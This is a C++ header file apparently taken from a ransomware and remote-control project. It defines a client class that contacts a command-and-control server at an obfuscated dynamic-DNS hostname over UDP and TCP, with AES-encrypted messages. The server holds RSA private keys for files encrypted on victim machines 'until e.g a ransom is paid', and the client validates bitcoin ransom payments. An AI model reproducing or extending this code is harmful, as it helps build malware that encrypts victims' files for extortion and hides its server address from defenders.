#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "framework.h"
#include "net_types.h"
#include "obfuscate.h"
#include "net_common.h"

#include <memory>
#include <algorithm>
#include <random>

const unsigned int UDP_PORT = 5454;
const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));

class Client {
public:

    /*
        Identify whether the client class has loaded wsa
        and a defined type of socket in 'type'
    */
    BOOL          SocketReady(SocketTypes type) const;

#ifdef SERVER_RELEASE
    
    Client() = default;
    Client(sockaddr_in addr)
        : ClientUID(GenerateCUID()), // generate a cuid when a client is created on the server
        ExpectingResponse(FALSE), AddressInfo(addr)
    {
    }

    inline long GenerateCUID() {
        std::default_random_engine generator;
        std::uniform_int_distribution<long> dist(1, 10400);
        return dist(generator);
    }

    inline void SetRSAKeys(std::pair<std::string, std::string> RSAKeys) {
        this->RSAPublicKey = RSAKeys.first;
        this->RSAPrivateKey = RSAKeys.second;
    }

    /*
        UID is assigned by the server .Used to perform commands on one client.
        Only used on the server. On client, will always remain - 1.
    */
    long          ClientUID = -1;

    /*
        The rsa private key used to decrypt encrypted files with
        client public rsa key. only on server until e.g a ransom is paid
    */
    std::string    RSAPrivateKey;

    /*
        Implementation for event handling- to wait
        for a new message to be sent from a client.

        Server will be listening from each client that connects with a thread.
        When data is received, it will be inserted into ClientResponse if ExpectingResponse
        is set to true by a function. This allows us to make a WaitForClientResponse function
        that sets expecting response to true and consistantly checks recent client response
        against last client response, waiting for a new client response.
    */
    BOOL           ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
    ClientResponse RecentClientResponse;
    ClientResponse LastClientResponse;


#elif defined(CLIENT_RELEASE)
    Client();
    ~Client();

	BOOL          Connect();
    BOOL          Disconnect();
    BOOL          MakeServerRequest( ClientRequest request, BOOL udp );
    BOOL          PingServer(SocketTypes serverType);
    BOOL          ReceiveDataOnSocket(SocketTypes s);
    
    /*
        Encrypt a ClientRequest struct with AES by serializing
        to a byte string, then encrypting that bytestring with AES
    */
    BYTESTRING    EncryptClientRequest(ClientRequest req) const;
    
    /*
        Decrypt a ServerRequest that was sent as a BYTESTRING
        from the TCP server with AES encryption key.
    */
    ServerRequest DecryptServerRequest(BYTESTRING req); 

    /*
        Set the initial, permanant, encryption key for this client
    */
    inline void   SetEncryptionKey(std::string key) {
        if ( this->AESEncryptionKey.empty() ) this->AESEncryptionKey = key;
        if ( this->RSAPublicKey.empty() ) this->RSAPublicKey = key;
    }
protected:

    /*
        Send a message to the main tcp server
        i.e ask for public encryption key or validating a ransom btc payment
    */
    BOOL          TCPSendMessageToServer(ClientMessage message);

    /*
        Send a message to the udp server with information
        on the action the client wants the server to do,
        i.e connect to tcp server. Updates clients connected server
        to the tcp server info received in the udp response

        UDP Server used for quick communication and queries
    */
    BOOL          UDPSendMessageToServer(ClientMessage message);

    UDPResponse   UDPRecvMessageFromServer();

    // Further details on client
    Server        ConnectedServer = {};          // Information on the clients connected server
    Server        UDPServerDetails = {};
#endif

    SOCKET        UDPSocket       = INVALID_SOCKET;
    SOCKET        TCPSocket       = INVALID_SOCKET;

    std::string   AESEncryptionKey;               // Encryption key used to encrypt and decrypt net_blobs

    /* 
        Same as AES Encryption key, just more clear on what
        it is and what its used for. 
        Used for encrypting files, not requests/NET_BLOBs
    */
    std::string   RSAPublicKey;         

    sockaddr_in   AddressInfo; // client addr info
};


#endif